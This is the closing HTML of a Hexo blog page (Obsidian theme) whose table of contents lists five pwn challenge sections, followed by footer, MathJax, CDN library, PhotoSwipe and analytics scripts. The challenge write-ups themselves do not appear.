+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目：pwn1"><span class="toc-number">1.</span> <span class="toc-text">题目：pwn1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目：pwn2"><span class="toc-number">2.</span> <span class="toc-text">题目：pwn2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目：pwn3"><span class="toc-number">3.</span> <span class="toc-text">题目：pwn3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目：pwn4"><span class="toc-number">4.</span> <span class="toc-text">题目：pwn4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目：pwn5"><span class="toc-number">5.</span> <span class="toc-text">题目：pwn5</span></a></li></ol>
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</div>
+
+    </div>
+</div>
+    <div id="back-to-top" class="animated fadeIn faster">
+        <div class="flow"></div>
+        <span class="percentage animated fadeIn faster">0%</span>
+        <span class="iconfont icon-top02 animated fadeIn faster"></span>
+    </div>
+</body>
+<footer>
+    <p class="copyright" id="copyright">
+        &copy; 2020
+        <span class="gradient-text">
+            V1ct0r
+        </span>.
+        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        Theme
+        <span class="gradient-text">
+            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
+        </span>
+        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
+    </p>
+</footer>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<script>
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+      preferredFont: "TeX",
+      availableFonts: ["STIX", "TeX"],
+      linebreaks: {
+        automatic: true
+      },
+      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"]
+      ],
+      processEscapes: true,
+      ignoreClass: "tex2jax_ignore|dno",
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      noUndefined: {
+        attributes: {
+          mathcolor: "red",
+          mathbackground: "#FFEEEE",
+          mathsize: "90%"
+        }
+      },
+      Macros: {
+        href: "{}"
+      }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script>
+  function initialMathJax() {
+    MathJax.Hub.Queue(function () {
+      var all = MathJax.Hub.getAllJax(),
+        i;
+      // console.log(all);
+      for (i = 0; i < all.length; i += 1) {
+        console.log(all[i].SourceElement().parentNode)
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  }
+
+  function reprocessMathJax() {
+    if (typeof MathJax !== 'undefined') {
+      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+    }
+  }
+</script>
+
+
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
+
+    
+<script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>
+
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/obsidian.js"></script>
+<script src="/js/jquery.truncate.js"></script>
+<script src="/js/search.js"></script>
+
+
+<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
+
+
+<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+
+<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
+
+
+
+
+    
+<script src="/js/busuanzi.min.js"></script>
+
+    <script>
+        $(document).ready(function () {
+            if ($('span[id^="busuanzi_"]').length) {
+                initialBusuanzi();
+            }
+        });
+    </script>
+
+
+
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
+
+
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-149874671-1');
+    </script>
+
+
+
+
+
+<script>
+    function initialTyped () {
+        var typedTextEl = $('.typed-text');
+        if (typedTextEl && typedTextEl.length > 0) {
+            var typed = new Typed('.typed-text', {
+                strings: ["Where there is a will,there is a way！", "有志者，事竟成！"],
+                typeSpeed: 90,
+                loop: true,
+                loopCount: Infinity,
+                backSpeed: 20,
+            });
+        }
+    }
+
+    if ($('.article-header') && $('.article-header').length) {
+        $(document).ready(function () {
+            initialTyped();
+        });
+    }
+</script>
+
+
+
+
+</html>
